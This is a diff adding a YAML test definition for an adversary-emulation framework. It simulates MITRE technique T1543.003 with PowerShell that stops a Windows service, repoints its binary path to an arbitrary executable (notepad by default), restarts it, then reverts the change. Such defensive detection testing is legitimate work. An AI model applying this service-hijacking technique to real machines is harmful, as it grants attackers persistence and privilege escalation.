@@ -1,0 +1,37 @@
+api_version: "2.0"
+name: Modify Service to Run Arbitrary Binary (Powershell)
+description: "This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.\nThis technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)\n"
+args:
+    - name: service_name
+      type: string
+      default: fax
+    - name: new_bin_path
+      type: String
+      default: $env:windir\system32\notepad.exe
+    - name: original_bin_path
+      type: String
+      default: $env:windir\system32\fxssvc.exe
+uuid: 1f896ce4-8070-4959-8a25-2658856a70c9
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1543: Create or Modify System Process'
+    subtechniques:
+        - 'T1543.003: Windows Service'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: modify-service-to-run-arbitrary-binary-(powershell)
+      inline: |-
+        Stop-Service -Name "{{.Args.service_name}}" -force -erroraction silentlycontinue | Out-Null
+        set-servicebinarypath -name "{{.Args.service_name}}" -path "{{.Args.new_bin_path}}"
+        start-service -Name "{{.Args.service_name}}" -erroraction silentlycontinue | out-null
+      executor: powershell
+      cleanup:
+        inline: |-
+            Stop-Service -Name "{{.Args.service_name}}" -force -erroraction silentlycontinue | Out-Null
+            set-servicebinarypath -name "{{.Args.service_name}}" -path "{{.Args.original_bin_path}}" -erroraction silentlycontinue | out-null
+        executor: powershell
